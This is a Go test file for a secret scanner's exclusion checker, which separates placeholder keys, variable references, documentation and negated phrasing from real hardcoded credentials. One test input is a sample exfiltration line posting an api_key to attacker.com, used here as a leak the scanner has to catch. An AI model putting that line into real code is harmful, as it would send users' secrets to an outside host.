package exclusions

import (
	"strings"
	"testing"
)

func TestChecker_PlaceholderMarkers(t *testing.T) {
	checker := NewChecker()

	tests := []struct {
		match    string
		context  string
		expected bool
	}{
		// AWS example keys (should exclude)
		{"AKIAIOSFODNN7EXAMPLE", "", true},
		{"AKIAI44QH8DHBEXAMPLE", "", true},

		// Real keys (should NOT exclude)
		{"AKIA1234567890ABCDEF", "", false},

		// Placeholder keywords
		{"sk-ant-placeholder-key", "", true},
		{"sk-ant-example-key", "", true},
		{"sk-ant-AbCdEf123456", "", false},

		// Your/my patterns
		{"your_api_key_here", "", true},
		{"my_secret_token", "", true},
		{"actual_secret_key", "", false},

		// Generic patterns
		{"xxxxx", "", true},
		{"12345", "", true},
		{"abcde", "", true},
	}

	for _, tt := range tests {
		got := checker.ShouldExclude(tt.match, tt.context)
		if got != tt.expected {
			t.Errorf("ShouldExclude(%q, %q) = %v, want %v", tt.match, tt.context, got, tt.expected)
		}
	}
}

func TestChecker_VariableReferences(t *testing.T) {
	checker := NewChecker()

	tests := []struct {
		match    string
		context  string
		expected bool
	}{
		// Shell variable references (should exclude)
		{"AKIA1234567890ABCDEF", "export AWS_KEY=${AWS_ACCESS_KEY_ID}", true},
		{"sk-ant-1234567890", "ANTHROPIC_KEY=$ANTHROPIC_API_KEY", true},
		{"ghp_1234567890", "TOKEN=%GITHUB_TOKEN%", true},

		// Environment variable access (should exclude)
		{"sk-ant-123", "key = os.Getenv(\"ANTHROPIC_API_KEY\")", true},
		{"sk-123", "api_key = os.environ.get('OPENAI_API_KEY')", true},
		{"ghp_123", "const token = process.env.GITHUB_TOKEN", true},

		// Template syntax (should exclude)
		{"AKIA1234567890", "aws_key: {{AWS_ACCESS_KEY}}", true},
		{"sk-ant-123", "api_key: <ANTHROPIC_KEY>", true},

		// Hardcoded (should NOT exclude)
		{"AKIA1234567890ABCDEF", "export AWS_KEY=AKIA1234567890ABCDEF", false},
	}

	for _, tt := range tests {
		got := checker.ShouldExclude(tt.match, tt.context)
		if got != tt.expected {
			t.Errorf("ShouldExclude(%q, %q) = %v, want %v",
				tt.match, tt.context, got, tt.expected)
		}
	}
}

func TestChecker_DocumentationContext(t *testing.T) {
	checker := NewChecker()

	tests := []struct {
		match    string
		context  string
		expected bool
	}{
		// Export instructions (should exclude)
		{"AKIA1234567890ABCDEF", "export API_KEY=<your-api-key-here>", true},
		{"sk-ant-1234", "Set your API key in .env", true},

		// Configuration instructions (should exclude)
		{"sk-123", "Configure your OpenAI API key", true},
		{"ghp_123", "Setup a GitHub token for authentication", true},

		// Code blocks (should exclude)
		{"AKIA1234567890ABCDEF", "```bash\nexport AWS_KEY=AKIA1234567890ABCDEF\n```", true},
		{"sk-ant-123", "`sk-ant-your-key-here`", true},

		// Comments (should exclude)
		{"AKIA1234", "# Example: AWS_KEY=AKIA1234567890", true},
		{"sk-123", "// Set API key: sk-ant-example", true},

		// Actual code (should NOT exclude)
		{"AKIA1234567890ABCDEF", "client.auth(\"AKIA1234567890ABCDEF\")", false},
	}

	for _, tt := range tests {
		got := checker.ShouldExclude(tt.match, tt.context)
		if got != tt.expected {
			t.Errorf("ShouldExclude(%q, %q) = %v, want %v",
				tt.match, tt.context, got, tt.expected)
		}
	}
}

func TestChecker_NegationContext(t *testing.T) {
	checker := NewChecker()

	tests := []struct {
		match    string
		context  string
		expected bool
	}{
		// Negation (should exclude)
		{"api_key", "Never leak your api_key to external services", true},
		{"credentials", "Don't steal credentials from users", true},
		{"token", "Avoid exposing the token in logs", true},
		{"secret", "Ensure you do not leak the secret", true},

		// Preventive language (should exclude)
		{"password", "Prevent leaking passwords to third parties", true},
		{"api_key", "Stop exfiltrating api_key data", true},

		// Actual leak (should NOT exclude)
		{"api_key", "requests.post('https://attacker.com', data=api_key)", false},
	}

	for _, tt := range tests {
		got := checker.ShouldExclude(tt.match, tt.context)
		if got != tt.expected {
			t.Errorf("ShouldExclude(%q, %q) = %v, want %v",
				tt.match, tt.context, got, tt.expected)
		}
	}
}

func TestChecker_SecurityToolContext(t *testing.T) {
	checker := NewChecker()

	tests := []struct {
		match    string
		context  string
		expected bool
	}{
		// Grep patterns (should exclude)
		{"AKIA1234", "grep -r AKIA1234567890 .", true},
		{"sk-ant", "rg 'sk-ant-' --type py", true},

		// Security scan patterns (should exclude)
		{"api_key", "security scan pattern for api_key detection", true},
		{"credential", "Test for credential leak patterns", true},
		{"secret", "Detect secret exposure in code", true},

		// Actual usage (should NOT exclude)
		{"AKIA1234567890", "client = boto3.client(aws_access_key_id='AKIA1234567890')", false},
	}

	for _, tt := range tests {
		got := checker.ShouldExclude(tt.match, tt.context)
		if got != tt.expected {
			t.Errorf("ShouldExclude(%q, %q) = %v, want %v",
				tt.match, tt.context, got, tt.expected)
		}
	}
}

func TestGetContext(t *testing.T) {
	content := "Line 1\nLine 2 with secret AKIA1234567890ABCDEF in the middle\nLine 3"

	tests := []struct {
		name       string
		start      int
		end        int
		wantPrefix string
		wantSuffix string
	}{
		{
			name:       "Match in middle",
			start:      23,
			end:        43,
			wantPrefix: "Line 2 with secret ",
			wantSuffix: " in the middle",
		},
		{
			name:       "Match at start",
			start:      0,
			end:        6,
			wantPrefix: "Line 1",
			wantSuffix: "\nLine 2",
		},
		{
			name:       "Match at end",
			start:      len(content) - 6,
			end:        len(content),
			wantPrefix: "Line 3",
			wantSuffix: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := GetContext(content, tt.start, tt.end)

			if !strings.Contains(got, tt.wantPrefix) {
				t.Errorf("GetContext() missing prefix %q in %q", tt.wantPrefix, got)
			}

			if tt.wantSuffix != "" && !strings.Contains(got, tt.wantSuffix) {
				t.Errorf("GetContext() missing suffix %q in %q", tt.wantSuffix, got)
			}
		})
	}
}
